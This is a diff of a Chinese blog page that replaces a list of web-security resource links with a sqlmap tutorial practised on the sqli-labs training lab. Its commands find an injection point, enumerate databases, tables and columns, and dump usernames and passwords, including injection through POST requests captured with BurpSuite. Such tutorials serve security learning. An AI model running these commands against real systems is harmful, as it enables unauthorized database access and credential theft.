@@ -79,17 +79,24 @@
 
 
 
-<meta name="description" content="知识类 知道创宇研发技能表 知道创宇博客 SecWiki Paper FreeBuf 安全客 CTF Wiki MDN Web 文档  实践类 各种Web安全在线练习平台 攻防世界 爬虫闯关  工具类 每天新增的CVE信息 国内外临时匿名邮箱及接收手机短信验证码网站 在线Sage 大数因式分解 have i been pwned? Firefox Monitor BootCDN Many Time">
+<meta name="description" content="这里我用sqli-labs来实验 判断注入点使用参数 -u 或 --url 来判断是否存在注入点 12sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1sqlmap --url http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1  找到注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Web安全资源收藏">
-<meta property="og:url" content="http://yoursite.com/2020/04/03/Web%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90%E6%94%B6%E8%97%8F/index.html">
+<meta property="og:title" content="sqlmap的基本操作">
+<meta property="og:url" content="http://yoursite.com/2020/04/12/sqlmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/index.html">
 <meta property="og:site_name" content="Oah&#39;s Blog">
-<meta property="og:description" content="知识类 知道创宇研发技能表 知道创宇博客 SecWiki Paper FreeBuf 安全客 CTF Wiki MDN Web 文档  实践类 各种Web安全在线练习平台 攻防世界 爬虫闯关  工具类 每天新增的CVE信息 国内外临时匿名邮箱及接收手机短信验证码网站 在线Sage 大数因式分解 have i been pwned? Firefox Monitor BootCDN Many Time">
-<meta property="article:published_time" content="2020-04-03T06:54:55.000Z">
-<meta property="article:modified_time" content="2020-04-12T07:39:09.376Z">
+<meta property="og:description" content="这里我用sqli-labs来实验 判断注入点使用参数 -u 或 --url 来判断是否存在注入点 12sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1sqlmap --url http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1  找到注入">
+<meta property="og:image" content="http://yoursite.com/2020/04/12/sqlmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/658713eb7e9d3b973c3b5d530b3727c9.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/12/sqlmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/b7cee69b9aa54c3fcdef4a52a8fb81b6.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/12/sqlmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/436133655c6c2418d0d195d1560cfe93.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/12/sqlmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/88205762d56fc26858d1c5c8ce5e3fc3.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/12/sqlmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/ab4001ee8ff9a26b87b5939580e46806.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/12/sqlmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/ffa6f23973774b3b7c2078f7c0bfd65f.png">
+<meta property="article:published_time" content="2020-04-12T07:40:17.000Z">
+<meta property="article:modified_time" content="2020-04-12T08:43:51.760Z">
 <meta property="article:author" content="Oah">
 <meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/04/12/sqlmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/658713eb7e9d3b973c3b5d530b3727c9.png">
 
 
 
@@ -119,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/04/03/Web安全资源收藏/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/04/12/sqlmap的基本操作/"/>
 
 
 
 
 
-  <title>Web安全资源收藏 | Oah's Blog</title>
+  <title>sqlmap的基本操作 | Oah's Blog</title>
   
 
 
@@ -232,7 +239,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/03/Web%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90%E6%94%B6%E8%97%8F/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/12/sqlmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Oah">
@@ -249,7 +256,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Web安全资源收藏</h1>
+          <h1 class="post-title" itemprop="name headline">sqlmap的基本操作</h1>
         
 
         <div class="post-meta">
@@ -261,8 +268,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T14:54:55+08:00">
-                2020-04-03
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-12T15:40:17+08:00">
+                2020-04-12
               </time>
             
 
@@ -299,41 +306,46 @@
       
 
       
-        <h1 id="知识类"><a href="#知识类" class="headerlink" title="知识类"></a>知识类</h1><ul>
-<li><a href="https://blog.knownsec.com/Knownsec_RD_Checklist/index.html" target="_blank" rel="noopener">知道创宇研发技能表</a></li>
-<li><a href="https://blog.knownsec.com/" target="_blank" rel="noopener">知道创宇博客</a></li>
-<li><a href="https://www.sec-wiki.com/" target="_blank" rel="noopener">SecWiki</a></li>
-<li><a href="https://paper.seebug.org/" target="_blank" rel="noopener">Paper</a></li>
-<li><a href="https://www.freebuf.com/" target="_blank" rel="noopener">FreeBuf</a></li>
-<li><a href="https://www.anquanke.com/" target="_blank" rel="noopener">安全客</a></li>
-<li><a href="https://ctf-wiki.github.io/ctf-wiki/" target="_blank" rel="noopener">CTF Wiki</a></li>
-<li><a href="https://developer.mozilla.org/zh-CN/" target="_blank" rel="noopener">MDN Web 文档</a></li>
-</ul>
-<h1 id="实践类"><a href="#实践类" class="headerlink" title="实践类"></a>实践类</h1><ul>
-<li><a href="https://bbs.zsxwz.com/thread-1392.htm" target="_blank" rel="noopener">各种Web安全在线练习平台</a></li>
-<li><a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">攻防世界</a></li>
-<li><a href="http://www.heibanke.com/lesson/crawler_ex00/" target="_blank" rel="noopener">爬虫闯关</a></li>
-</ul>
-<h1 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h1><ul>
-<li><a href="https://cassandra.cerias.purdue.edu/CVE_changes/today.html" target="_blank" rel="noopener">每天新增的CVE信息</a></li>
-<li><a href="https://mp.weixin.qq.com/s/XJj5vCGw-twak1ix6b6cIQ" target="_blank" rel="noopener">国内外临时匿名邮箱及接收手机短信验证码网站</a></li>
-<li><a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">在线Sage</a></li>
-<li><a href="http://factordb.com/" target="_blank" rel="noopener">大数因式分解</a></li>
-<li><a href="https://haveibeenpwned.com/" target="_blank" rel="noopener">have i been pwned?</a></li>
-<li><a href="https://monitor.firefox.com/" target="_blank" rel="noopener">Firefox Monitor</a></li>
-<li><a href="https://www.bootcdn.cn/" target="_blank" rel="noopener">BootCDN</a></li>
-<li><a href="https://github.com/CameronLonsdale/MTP" target="_blank" rel="noopener">Many Time Pad</a></li>
-</ul>
-<h1 id="博客收藏"><a href="#博客收藏" class="headerlink" title="博客收藏"></a>博客收藏</h1><ul>
-<li><a href="http://mayoterry.com/" target="_blank" rel="noopener">mayoterry的博客</a></li>
-<li><a href="https://cloud.tencent.com/developer/column/81483" target="_blank" rel="noopener">一名白帽的成长史</a></li>
-<li><a href="http://rui0.cn/" target="_blank" rel="noopener">Ruilin的博客</a></li>
-<li><a href="https://evilcos.me/" target="_blank" rel="noopener">EVILCOS（余弦）的博客</a></li>
-<li><a href="https://www.andseclab.com/博客/" target="_blank" rel="noopener">A&amp;D攻防工作室的博客</a></li>
-<li><a href="https://www.yuque.com/exploit/job/" target="_blank" rel="noopener">安全面试经验汇总 · 语雀</a></li>
-<li><a href="https://www.nowcoder.com/discuss/401108/" target="_blank" rel="noopener">40张图解被问千百遍的TCP三次握手和四次挥手面试题</a></li>
-</ul>
+        <p>这里我用sqli-labs来实验</p>
+<h1 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h1><p>使用参数 <code>-u</code> 或 <code>--url</code> 来判断是否存在注入点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1</span><br><span class="line">sqlmap --url http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1</span><br></pre></td></tr></table></figure>
 
+<p>找到注入点</p>
+<p><img src="658713eb7e9d3b973c3b5d530b3727c9.png" alt="img"></p>
+<h1 id="列出所有数据库信息"><a href="#列出所有数据库信息" class="headerlink" title="列出所有数据库信息"></a>列出所有数据库信息</h1><p>使用 <code>--dbs</code> 参数列出所有数据库信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1 --dbs</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<p><img src="b7cee69b9aa54c3fcdef4a52a8fb81b6.png" alt="img"></p>
+<h1 id="列出当前正在使用的数据库"><a href="#列出当前正在使用的数据库" class="headerlink" title="列出当前正在使用的数据库"></a>列出当前正在使用的数据库</h1><p>使用 <code>--current-db</code> 参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1 --current-db</span><br></pre></td></tr></table></figure>
+
+<p>当前使用的数据库为security</p>
+<p><img src="436133655c6c2418d0d195d1560cfe93.png" alt="img"></p>
+<h1 id="列出数据表"><a href="#列出数据表" class="headerlink" title="列出数据表"></a>列出数据表</h1><p>使用 <code>-D &lt;数据库名&gt;</code> 参数指定数据库，然后用 <code>--tables</code> 参数列出数据库的所有表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1 -D security --tables</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<p><img src="88205762d56fc26858d1c5c8ce5e3fc3.png" alt="img"></p>
+<h1 id="列出字段"><a href="#列出字段" class="headerlink" title="列出字段"></a>列出字段</h1><p>使用 <code>-D &lt;数据库名&gt;</code> 参数指定数据库，然后用 <code>-T &lt;表名&gt;</code> 参数指定表，最后用 <code>--columns</code> 参数列出所有字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1 -D security -T users --columns</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<p><img src="ab4001ee8ff9a26b87b5939580e46806.png" alt="img"></p>
+<h1 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h1><p>使用 <code>-D &lt;数据库名&gt;</code> 参数指定数据库，用 <code>-T &lt;表名&gt;</code> 参数指定表，然后用 <code>-C &lt;字段名&gt;</code> 参数指定字段（用逗号分隔多个字段），最后用 <code>--dump</code> 参数读取数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1 -D security -T users -C id,password,username --dump</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<p><img src="ffa6f23973774b3b7c2078f7c0bfd65f.png" alt="img"></p>
+<h1 id="对于POST请求的注入"><a href="#对于POST请求的注入" class="headerlink" title="对于POST请求的注入"></a>对于POST请求的注入</h1><h2 id="自动搜索参数"><a href="#自动搜索参数" class="headerlink" title="自动搜索参数"></a>自动搜索参数</h2><p>使用 <code>--forms</code> 参数自动搜索注入点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1 --forms</span><br></pre></td></tr></table></figure>
+
+<h2 id="指定参数搜索"><a href="#指定参数搜索" class="headerlink" title="指定参数搜索"></a>指定参数搜索</h2><p>使用 <code>--data &lt;参数&gt;=&lt;值&gt;(&amp;&lt;参数&gt;=&lt;值&gt;)</code> 从指定参数搜索注入点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;www.example.com&#x2F;Less-1&#x2F;?id&#x3D;1 --data &lt;参数&gt;&#x3D;&lt;值&gt;&amp;&lt;参数&gt;&#x3D;&lt;值&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用POST报文搜索"><a href="#使用POST报文搜索" class="headerlink" title="使用POST报文搜索"></a>使用POST报文搜索</h2><p>先用BurpSuite把报文抓下来，保存为txt文件。用 <code>-r &lt;文件路径&gt;</code> 参数选择txt文件，用 <code>-p &lt;参数名&gt;</code> 参数指定参数名</p>
+<p>然后就跟上面的操作一样了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt -p uname --dbs</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -363,8 +375,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/03/27/RSA%E8%AE%A1%E7%AE%97d%E7%9A%84%E6%96%B9%E6%B3%95/" rel="next" title="RSA计算d的方法">
-                <i class="fa fa-chevron-left"></i> RSA计算d的方法
+              <a href="/2020/04/03/JavaScript%E5%AE%9E%E7%8E%B0%E8%87%AA%E6%88%91%E5%A4%8D%E5%88%B6/" rel="next" title="JavaScript实现自我复制">
+                <i class="fa fa-chevron-left"></i> JavaScript实现自我复制
               </a>
             
           </div>
@@ -372,10 +384,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/04/03/pip%E4%BD%BF%E7%94%A8%E5%9B%BD%E5%86%85%E6%BA%90/" rel="prev" title="pip使用国内源">
-                pip使用国内源 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -498,7 +506,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#知识类"><span class="nav-number">1.</span> <span class="nav-text">知识类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实践类"><span class="nav-number">2.</span> <span class="nav-text">实践类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#工具类"><span class="nav-number">3.</span> <span class="nav-text">工具类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#博客收藏"><span class="nav-number">4.</span> <span class="nav-text">博客收藏</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#判断注入点"><span class="nav-number">1.</span> <span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#列出所有数据库信息"><span class="nav-number">2.</span> <span class="nav-text">列出所有数据库信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#列出当前正在使用的数据库"><span class="nav-number">3.</span> <span class="nav-text">列出当前正在使用的数据库</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#列出数据表"><span class="nav-number">4.</span> <span class="nav-text">列出数据表</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#列出字段"><span class="nav-number">5.</span> <span class="nav-text">列出字段</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#读取数据"><span class="nav-number">6.</span> <span class="nav-text">读取数据</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#对于POST请求的注入"><span class="nav-number">7.</span> <span class="nav-text">对于POST请求的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#自动搜索参数"><span class="nav-number">7.1.</span> <span class="nav-text">自动搜索参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#指定参数搜索"><span class="nav-number">7.2.</span> <span class="nav-text">指定参数搜索</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用POST报文搜索"><span class="nav-number">7.3.</span> <span class="nav-text">使用POST报文搜索</span></a></li></ol></li></ol></div>
             
 
           </div>
